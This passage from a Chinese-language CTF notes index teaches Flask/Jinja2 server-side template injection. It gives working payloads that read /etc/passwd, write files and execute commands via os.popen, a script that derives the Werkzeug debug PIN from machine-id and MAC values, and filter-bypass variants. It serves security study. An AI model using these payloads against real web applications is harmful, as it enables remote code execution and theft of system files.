%}#\uff08\u8fd9\u4e2a\u662f\u4e0b\u5212\u7ebf\uff0c\u7528pop\u53d6\uff0c\u548c\u4e0a\u9762\u7c7b\u4f3c\uff09\n{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}\n{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}\n{% set space=chcr(three*three*five-five-five-three) %}\n{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}\n{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}\n</code></pre> <p>\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\uff0c\u4e4b\u540e\u4f60\u8fd8\u4f1a\u770b\u5230\u4ed6\u7684\u3002</p>"},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_4","title":"\u4f7f\u7528\u5de5\u5177","text":"<p>tplmap:ssti\u626b\u63cf\u5de5\u5177\uff0c\u5728\u521d\u671f\u4f1a\u5e26\u7ed9\u4f60\u7f8e\u5999\u7684\u4f53\u9a8c</p> <pre><code>git clone https://github.com/epinna/tplmap\n</code></pre> <p>\u81f3\u4e8e\u7528\u6cd5-h\u81ea\u5df1\u6162\u6162\u6478\u7d22\u3002</p>"},{"location":"web_bak/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#django","title":"Django\u62a5\u9519","text":"<p>\u4e0d\u662fssti</p> <p>\u4f46\u662f\u662f\u6a21\u677f\u6240\u4ee5\u653e\u8fd9\u4e86\uff0c\u539f\u7406\u662f\u6ea2\u51fa</p> <p>%80\u540e\u7684\u5b57\u7b26\u7ed3\u5408\u62a5\u9519\u4fe1\u606fUnicodeEncodeError\u53ef\u4ee5\u63a8\u65ad\u662f\u7531\u4e8eascii\u7f16\u7801\u4e0d\u652f\u6301\u5bfc\u81f4\u7684\u62a5\u9519</p> <p>\u7f51\u7ad9\u662f\u4f7f\u7528Django\u8fdb\u884c\u5f00\u53d1\u7684,\u7ed3\u5408PHP\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u6ce8\u5165@\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u6f0f\u6d1e,\u4f9d\u6b21\u67e5\u770bpython\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u6570\u636e\u5e93\u5f97\u5230flag\u7684\u5185\u5bb9</p> <p>\uff08\u8fd9\u4e2a\u6211\u81ea\u5df1\u603b\u7ed3\u56fe\u7247\u88ab\u541e\u6389\u4e86\uff0c\u5148\u653e\u7740\uff09</p>"},{"location":"web_bak/ssti/flask/flask_pin/","title":"pin\u7801\u7834\u89e3","text":"<p>\u8fd9\u91cc\u7684pin\u7801\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e00\u79cd\u8ba4\u8bc1\u7801\u3002</p> <p>\u8f93\u5165\u5931\u8d25\u8d85\u8fc710\u6b21\u5c31\u4f1a\u81ea\u52a8\u9501\u5b9a\uff0c\u6240\u4ee5\u4e0d\u80fd\u8c6a\u593a\uff0c\u53ea\u80fd\u667a\u53d6\u3002</p> <p>\u5371\u5bb3\uff1a</p> <p>1.\u4f1a\u6cc4\u9732\u5f53\u524d\u62a5\u9519\u9875\u9762\u7684\u6e90\u7801\uff0c\u53ef\u4f9b\u5ba1\u8ba1\u6316\u6398\u5176\u4ed6\u6f0f\u6d1e</p> <p>2.\u4f1a\u6cc4\u9732Web\u5e94\u7528\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u53caPython\u89e3\u91ca\u5668\u7684\u8def\u5f84</p> <p>3.debug\u9875\u9762\u4e2d\u5305\u542bPython\u7684\u4ea4\u4e92\u5f0fshell\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610fPython\u4ee3\u7801</p> <p>\u8fd9\u524d\u4e24\u6761\u4e00\u822c\u90fd\u662f\u4e0e\u4ee3\u7801\u5ba1\u8ba1\u76f8\u5173\uff0c\u53ef\u4ee5\u8bb2\u96be\u70b9\u80af\u5b9a\u4e0d\u5728\u8fd9\uff0c\u7136\u540e\u6700\u540e\u4e00\u6761\u5c31\u662f\u8fd9\u91cc\u6240\u8bb2\u7684pin\u7801\u66b4\u529b\u7834\u89e3</p> <p>\u78b0\u5230\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u8981\u6c42\u662fflask\u6a21\u677f\u5b83\u5f00\u542fdebug\u6a21\u5f0f\uff08\u4fe1\u606f\u6cc4\u9732\u5df2\u7ecf\u662f\u975e\u5e38\u5371\u9669\u4e86\uff09</p> <p>\u8fd9\u4e2adebug\u9875\u9762\u5927\u6982\u662f\u957f\u8fd9\u4e2a\u6837\u5b50\uff1a</p> <p></p> <p></p> <p>\u4e0d\u4ec5\u80fd\u770b\u62a5\u9519\u6e90\u7801\uff0c\u5728\u65c1\u8fb9\u6709\u4e2a\u9ed1\u8272\u7684\u5c0f\u6846\u5b50\u70b9\u5f00\u4e4b\u540e\u5c31\u662f\u8fd9\u4e2apin\u7801\u7684\u754c\u9762\uff0c\u7834\u89e3\u51fa\u8fd9\u4e2apin\u7801\uff0c\u5c31\u5982\u540c\u4e4b\u524d\u7b2c\u4e09\u6761\u6240\u8ff0\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5371\u9669\u7a0b\u5ea6\u975e\u5e38\u7684\u9ad8\u3002</p> <p>pin\u7801\u7684\u751f\u6210\u673a\u5236\u611f\u5174\u8da3\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7f51\u4e0a\u67e5\u627e\u8d44\u6599\uff0c\u8fd9\u91cc\u4e0d\u505a\u53d9\u8ff0</p> <p>\u800cpin\u7801\u751f\u6210\u4f9d\u8d56\u76846\u4e2a\u5143\u7d20\u6211\u4eec\u662f\u77e5\u9053\u7684\uff1a</p> <p>1.\u670d\u52a1\u5668\u8fd0\u884cflask\u6240\u767b\u5f55\u7684\u7528\u6237\u540d\uff08\u67e5\u770b/etc/passwd\u6216\u8005\u731c\uff0c\u4e00\u822c\u4e3aroot\u6216\u8005\u662fflaskweb\uff09</p> <p>2.modname\u3002\u4e00\u822c\u4e0d\u53d8\u5c31\u662fflask.app</p> <p>3.getattr(app, \u201cname\u201d, app.class.name)\u3002python\u8be5\u503c\u4e00\u822c\u4e3aFlask \uff0c\u503c\u4e00\u822c\u4e0d\u53d8</p> <p>4.flask\u5e93\u4e0bapp.py\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u62a5\u9519\u4fe1\u606f\u4f1a\u6cc4\u9732\u8be5\u503c\u3002\uff08\u6709\u70b9\u8003\u773c\u529b\uff09</p> <p>5.\u5f53\u524d\u7f51\u7edc\u7684mac\u5730\u5740\u7684\u5341\u8fdb\u5236\u6570\u3002\u901a\u8fc7\u6587\u4ef6/sys/class/net/eth0/address \u83b7\u53d6(eth0\u4e3a\u7f51\u5361\u540d)</p> <p>6.\u673a\u5668\u7684id\uff1a\u5bf9\u4e8e\u975edocker\u673a\u6bcf\u4e00\u4e2a\u673a\u5668\u90fd\u4f1a\u6709\u81ea\u5df2\u552f\u4e00\u7684id</p> <p>Linux\uff1a/etc/machine-id\u6216/proc/sys/kernel/random/boot_i\uff0c\u6709\u7684\u7cfb\u7edf\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6587\u4ef6</p> <p>docker\uff1a/proc/self/cgroup</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u7206\u7834pin\u7801\u4e86\uff1a</p> <p>\u4f7f\u7528\u811a\u672c\uff1a\uff08\u5ad6\u7684\uff09</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\nprivate_bits = [\n    '2485410388611',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed'# get_machine_id(), /etc/machine-id\n]\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\ncookie_name = '__wzd' + h.hexdigest()[:20]\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\nprint(rv)\nPython\n</code></pre> <p>\u7136\u540e\u518d\u60f3\u60f3\uff0c\u8fd9\u4e2a\u653e\u5230ssti\u91cc\u9762\u7684\u539f\u56e0\uff0c\u6a21\u677f\u6ce8\u5165\u561b</p> <p>\u591a\u591a\u5c11\u5c11\u8fd8\u662f\u8ddfssti\u6709\u4e9b\u5173\u7cfb\uff0c\u9664\u4e86\u4e0a\u9762\u6240\u8bf4\u7684\u57fa\u672c\u4e0d\u53d8\u7684\uff0c\u5176\u4ed6\u4e1c\u897f\u662f\u9700\u8981\u901a\u8fc7\u6a21\u677f\u6ce8\u5165\u53bb\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u540c\u6837\u7ed9\u51fa\u4e00\u4e9b\u53ef\u80fd\u7528\u7684\u4e0a\u7684payload</p> <pre><code>\u83b7\u53d6MAC\u5730\u5740\uff1a\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}\u8bb2\u5b9e\u8bdd\u8fd9\u4e2aif\u662f\u771f\u7684\u5f88\u5389\u5bb3\uff0c\u4ee5\u540e\u4f1a\u78b0\u5230if\u6765\u7ed5\u8fc7\n</code></pre> <pre><code>\u83b7\u53d6\u673a\u5668\u7684ID\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}\n</code></pre> <p>\u81ea\u5df1\u641c\uff1a</p> <p>GYCTF2020 FlaskApp</p>"},{"location":"web_bak/ssti/flask/flask_ssti/","title":"Flask ssti","text":""},{"location":"web_bak/ssti/flask/flask_ssti/#flaskjinja2","title":"FLASK\u6a21\u677f\uff08jinja2\u6846\u67b6)","text":"<p>\u8fd9\u53ef\u80fd\u662f\u4f60\u5c06\u4f1a\u78b0\u5230\u7684\u6700\u591a\u7684\u6a21\u677f</p> <p>\u5f04\u61c2\u8fd9\u4e2a\u662f\u63a5\u4e0b\u6765\u51e0\u4e2a\u6a21\u677f\u7684\u6bd4\u8f83\u91cd\u8981\u7684\u57fa\u7840\u3002\uff08\u6240\u4ee5\u53ef\u80fd\u4f1a\u5570\u55e6\uff09</p> <p>\u6a21\u677f\u57fa\u4e8epython,\u53ef\u80fd\u662fpy2\u4e5f\u53ef\u80fd\u662fpy3\uff0c\u8c8c\u4f3cpy2\u4f1a\u591a\u4e00\u70b9\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#flask","title":"Flask","text":"<p>\u5982\u679c\u6e32\u67d3\u7684\u6a21\u7248\u5185\u5bb9\u53d7\u5230\u7528\u6237\u7684\u63a7\u5236\u3002\u3002\u3002\u3002</p> <pre><code>from flask import Flask, request\nfrom jinja2 import Template\napp = Flask(__name__)\n@app.route(\"/\")\ndef index():\nname = request.args.get('name', 'guest')\nt = Template(\"Hello \" + name)\nreturn t.render()\nif __name__ == \"__main__\":\napp.run();\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\u663e\u7136\u662fname</p> <p>\u63d0\u4ea4 ?name=guest.{{7*7}}</p> <p>\u4f1a\u53d1\u73b0\u88ab\u8ba1\u7b97\u6210\u4e8649</p> <p>\u53c8\u6216\u8005\u662f{{\u2018abcd\u2019,upper()}}(\u672c\u8d28\u4e0a\u8fd8\u662fpy)</p> <p>\u4f1a\u8f93\u51faABCD</p> <p>\u4e0b\u9762\u5f00\u59cb\u52a0\u901f\uff1a</p> <p>py2:</p> <pre><code>#\u8bfb\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n#\u5199\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write(\"\") }}\n</code></pre> <p>py3:</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#_1","title":"\u547d\u4ee4\u6267\u884c\uff1a","text":"<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}\n#\u6587\u4ef6\u64cd\u4f5c\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}\n</code></pre> <p>\uff08py2\u5305\u542b\u7684\u7c7bpy3\u4e00\u822c\u90fd\u6709\uff0c\u4f46\u662f\u4f4d\u7f6e\u987a\u5e8f\u4e0d\u592a\u4e00\u6837\uff0c\u7136\u540e\u5c31\u662f\u8c03\u7528\u683c\u5f0f\u786e\u5b9e\u4e0d\u592a\u4e00\u6837\uff09</p> <p>\u8fd9\u91cc\u4ee5py2\u4e3a\u4f8b\uff1a</p> <p>flask\u51fd\u6570\u89e3\u6790\uff1a</p> <pre><code>__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b\n__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868\n__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4\n__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b\n__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\n</code></pre> <p>{{ ''.class.mro[2].subclasses()40.read() }}\uff08\u5982\u679c\u8fd8\u8bb0\u5f97\u7684\u8bdd{{}}\u662f\u8f93\u51fa\u7684\u610f\u601d\uff09</p> <p>\u6240\u4ee5\u8fd9\u53e5\u8bdd\u7684\u903b\u8f91\u662f\u4ec0\u4e48\u5462\uff1f</p> <p>\u521b\u5efa\u4e00\u4e2a\u7a7a\u5b57\u7b26\uff0c\u8fd4\u56de\u5b83\u7684\u53c2\u6570\u7c7b\u578b\uff0c\u5bfb\u627e\u57fa\u7c7b\uff0c\u627e\u5b50\u7c7b\uff0c\u9009\u53d6\u7b2c40\u4e2a\u5b50\u7c7b\uff0c\u8c03\u7528\u5176\u4e2d\u7684read\u51fd\u6570\u3002\u8fd9\u4e5f\u662f\u4e00\u6761\u903b\u8f91\u94fe\uff0cflask\u7684\u6a21\u677f\u6ce8\u5165\u7684\u6838\u5fc3\u5c31\u662f\u8fd9\u6761\u903b\u8f91\u94fe\u3002\u6216\u8005\u88ab\u79f0\u4e4b\u4e3a\u6c99\u76d2\u9003\u9038\uff1a\u521b\u5efa\u4e00\u4e2a\u76f8\u5bf9\u5c01\u95ed\u7684python\u6c99\u76d2\u73af\u5883\uff0c\u7136\u540e\u4ece\u67d0\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u627e\u5230\u6700\u9876\u5c42\uff0c\u7136\u540e\u4e00\u6b65\u4e00\u6b65\u5411\u4e0b\u6478\u7d22\uff0c\u6700\u540e\u4ece\u6c99\u7bb1\u4e2d\u9003\u9038\u51fa\u53bb\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#flask_1","title":"FLASK\u6d41\u7a0b","text":"<p>\u4e5f\u53ef\u4ee5\u53eb\u5c0fpayload\uff0c\u4e0b\u6b21\u627e\u4e2a\u57fa\u7840\u70b9\u7684\uff0c\u6ca1\u8fc7\u6ee4\u7684\u9898\uff0c\u53ef\u4ee5\u597d\u597d\u8bd5\u8bd5\u3002</p> <pre><code>\u51fd\u6570\u89e3\u6790\n__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b:\n''.__class__.__mro__[2]//mro\u627e\u7684\u4f1a\u6bd4base\u5feb\u4f5c\u7528\u7c7b\u4f3c\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8]//\u9488\u5bf9jinjia2/flask\u4e3a[9]\u9002\u7528\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b\u540e\uff0c\u7ee7\u7eed\u5411\u4e0b\u83b7\u53d6\u57fa\u672c\u7c7b(object)\u7684\u5b50\u7c7b\nobject.__subclasses__()\n</code></pre> <pre><code>\u627e\u5230\u91cd\u8f7d\u8fc7\u7684__init__\u7c7b(\u5728\u83b7\u53d6\u521d\u59cb\u5316\u5c5e\u6027\u540e\uff0c\u5e26wrapper\u7684\u8bf4\u660e\u6ca1\u6709\u91cd\u8f7d\uff0c\u5bfb\u627e\u4e0d\u5e26warpper\u7684)\u6240\u8c13\u91cd\u8f7d\uff0c\u5c31\u662f\u591a\u4e2a\u76f8\u540c\u51fd\u6570\u540d\u7684\u51fd\u6570\uff0c\u6839\u636e\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u53c2\u6570\u7c7b\u578b\u800c\u6267\u884c\u4e0d\u540c\u7684\u529f\u80fd\u3002\u6240\u4ee5\u51fd\u6570\u91cd\u8f7d\u5b9e\u8d28\u4e0a\u662f\u4e3a\u4e86\u89e3\u51b3\u7f16\u7a0b\u4e2d\u53c2\u6570\u53ef\u53d8\u4e0d\u7edf\u4e00\u7684\u95ee\u9898\u3002\u7136\u540e\u5c31\u662f\u91cd\u8f7d\u4e86\u90a3\u8fd8\u600e\u4e48\u7528\u561b\u3002\n''.__class__.__mro__[2].__subclasses__()[99].__init__//\u5bf999\u4e2a\u5b9e\u4f8b\u5316&lt;slot wrapper '__init__' of 'object' objects&gt;''.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt;\n</code></pre> <pre><code>\u67e5\u770b\u5176\u5f15\u7528__builtins__builtins\u5373\u662f\u5f15\u7528\uff0cPython\u7a0b\u5e8f\u4e00\u65e6\u542f\u52a8\uff0c\u5b83\u5c31\u4f1a\u5728\u7a0b\u5e8f\u5458\u6240\u5199\u7684\u4ee3\u7801\u6ca1\u6709\u8fd0\u884c\u4e4b\u524d\u5c31\u5df2\u7ecf\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4e86,\u800c\u5bf9\u4e8ebuiltins\u5374\u4e0d\u7528\u5bfc\u5165\uff0c\u5b83\u5728\u4efb\u4f55\u6a21\u5757\u90fd\u76f4\u63a5\u53ef\u89c1\uff0c\u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u8c03\u7528\u5f15\u7528\u7684\u6a21\u5757\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']\n</code></pre> <pre><code>\u8fd9\u91cc\u4f1a\u8fd4\u56dedict\u7c7b\u578b\uff0c\u5bfb\u627ekeys\u4e2d\u53ef\u7528\u51fd\u6570\uff0c\u76f4\u63a5\u8c03\u7528\u5373\u53ef\uff0c\u4f7f\u7528keys\u4e2d\u7684file\u4ee5\u5b9e\u73b0\u8bfb\u53d6\u6587\u4ef6\u7684\u529f\u80fd\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()\n</code></pre> <p>\u81f3\u6b64\u4e00\u6761\u9003\u9038\u94fe\u5c31\u6784\u9020\u4e86\u51fa\u6765\u3002</p> <p>\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u6709\u4e9b\u51fd\u6570\u8fd8\u662f\u86ee\u96be\u627e\u7684\uff0c\u4e0d\u77e5\u9053\u8be5\u7528\u54ea\u4e9b\u7c7b\u6240\u4ee5\u4f1a\u6709\u4e00\u4e9b\u5e38\u7528\u7684payload:</p> <p>\u90fd\u662fpy2\u7684\uff1a</p> <p>\u8bfb\u5199\u6587\u4ef6\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\n</code></pre> <p>\u547d\u4ee4\u6267\u884c\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\uff1a</p> <p>\u9996\u5148\u5c31\u662f\u5224\u65ad\uff0c\u662f\u5426\u5b58\u5728ssti\u6a21\u677f\u6ce8\u5165\u70b9</p> <p>\u786e\u5b9a\u627e\u5230\u6ce8\u5165\u70b9\u4e4b\u540e\uff0c\u7531\u4e8eflask\u7b49ssti\u6a21\u677f\u90fd\u662f\u7531python\u7f16\u5199\uff0c\u6211\u4eec\u53c8\u53ef\u4ee5\u5728\u4e0a\u9762\u6267\u884c\u4ee3\u7801\uff0c\u4e8e\u662f\u5c31\u80fd\u591f\u5728ssti\u4e0a\u67e5\u627e\u6846\u67b6\u4e2d\u6240\u5305\u542b\u7684\u7c7b</p> <p>\u627e\u5230\u67d0\u4e2a\u7c7b\u4e4b\u540e\u7ee7\u7eed\u8c03\u7528\uff0c\u627e\u5230\u5b50\u7c7b\uff0c\u7236\u7c7b\u7b49</p> <p>\u6700\u540e\u901a\u8fc7\u627e\u5230\u7684\u7c7b\u4e2d\u53ef\u80fd\u5305\u542b\u7684\u51fd\u6570os.\u3002\u3002\u3002\u3002\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4ee3\u7801\u5373\u53ef\u3002</p> <pre><code>.__class__.__mro__//\u627e\u57fa\u7c7b\n.__class__.__mro__[0].__subclasses__()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\n{{\"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}//.init.globals\u6765\u627eos\u7c7b\u4e0b\u7684\uff0cinit\u521d\u59cb\u5316\u7c7b\uff0c\u7136\u540eglobals\u5168\u5c40\u6765\u67e5\u627e\u6240\u6709\u7684\u65b9\u6cd5\u53ca\u53d8\u91cf\u53ca\u53c2\u6570\u3002\n.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\uff0c\u6267\u884c\u5e76\u4e14\u8c03\u7528\u3002\n{{config.__class__.__init__.__globals__['os'].environ}}\u8fd9\u4e2a\u662f\u5173\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\uff0c\u6709\u65f6\u5019FLAG\u4e5f\u4f1a\u653e\u5728\u914d\u7f6e\u6587\u4ef6\u4e4b\u4e2d\u3002\n</code></pre>"},{"location":"web_bak/ssti/flask/flask_ssti/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#_3","title":"\u7ed5\u8fc7\u4e2d\u62ec\u53f7","text":"<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()\n</code></pre> <pre><code>\u4f7f\u7528gititem\u7ed5\u8fc7\u3002\u5982\u539fpoc {{\"\".class.bases[0]}}\u7ed5\u8fc7\u540e{{\"\".class.bases.getitem(0)}}\n</code></pre> <p>pop() \u51fd\u6570\u7528\u4e8e\u79fb\u9664\u5217\u8868\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff08\u9ed8\u8ba4\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u5e76\u4e14\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u503c</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#_4","title":"\u8fc7\u6ee4\u5f15\u53f7","text":"<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd\n</code></pre>"},{"location":"web_bak/ssti/flask/flask_ssti/#_5","title":"\u8fc7\u6ee4\u53cc\u4e0b\u5212\u7ebf","text":"<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n</code></pre> <p>\u8fd9\u91cc\u7528\u5230\u7684\u662frequest:(\u7a0d\u5fae\u89e3\u91ca\u4e00\u4e0b)</p> <p><code>{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&amp;b=__mro__&amp;c=__subclasses__}}</code></p> <pre><code>\u5982\u4e0b\u4e3a\u5e38\u7528\u7684request\u59ff\u52bfrequest.args.x1      get\u4f20\u53c2request.values.x1    post\u4f20\u53c2request.cookiesrequest.form.x1     post\u4f20\u53c2    (Content-Type:applicaation/x-www-form-urlencoded\u6216multipart/form-data)request.data          post\u4f20\u53c2    (Content-Type:a/b)request.json      post\u4f20json  (Content-Type:application/json)\n</code></pre> <p>\u5728Flask\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u662f\u8fd9\u6837\u4ecb\u7ecdrequest\u7684\uff1a\u5bf9\u4e8e Web \u5e94\u7528\uff0c\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u6570\u636e\u4ea4\u4e92\u81f3\u5173\u91cd\u8981\u3002\u5728 Flask \u4e2d\u7531\u5168\u5c40\u7684 request \u5bf9\u8c61\u6765\u63d0\u4f9b\u8fd9\u4e9b\u4fe1\u606f\u3002</p>"},{"location":"web_bak/ssti/flask/flask_ssti/#subclasses","title":"\u8fc7\u6ee4\u4e86subclasses\u7b49\u5b57\u7b26","text":"<pre><code>\u62fc\u51d1\u6cd5\n\u539fpoc{{\"\".class.bases[0].subclasses()}}\n\u7ed5\u8fc7{{\"\".class.bases[0]'subcla'+'sses'}}\n</code></pre>"},{"location":"web_bak/ssti/flask/flask_ssti/#class","title":"\u8fc7\u6ee4class","text":"<pre><code>\u4f7f\u7528sessionpoc{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}\u591a\u4e2abases[0]\u662f\u56e0\u4e3a\u4e00\u76f4\u5728\u5411\u4e0a\u627eobject\u7c7b\u3002\u4f7f\u7528mro\u5c31\u4f1a\u5f88\u65b9\u4fbf\n</code></pre>"},{"location":"web_bak/ssti/flask/flask_ssti/#_6","title":"\u8fc7\u6ee4\u5173\u952e\u5b57","text":"<pre><code>base64\u7f16\u7801\u7ed5\u8fc7(\u7f16\u7801\u7684\u8bdd\u6211\u9690\u7ea6\u8bb0\u5f97py3\u597d\u50cf\u7528\u4e0d\u4e86)\n__getattribute__\u4f7f\u7528\u5b9e\u4f8b\u8bbf\u95ee\u5c5e\u6027\u65f6,\u8c03\u7528\u8be5\u65b9\u6cd5\n\u4f8b\u5982\u88ab\u8fc7\u6ee4\u6389__class__\u5173\u952e\u8bcd\n{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n\u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7\n{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n</code></pre> 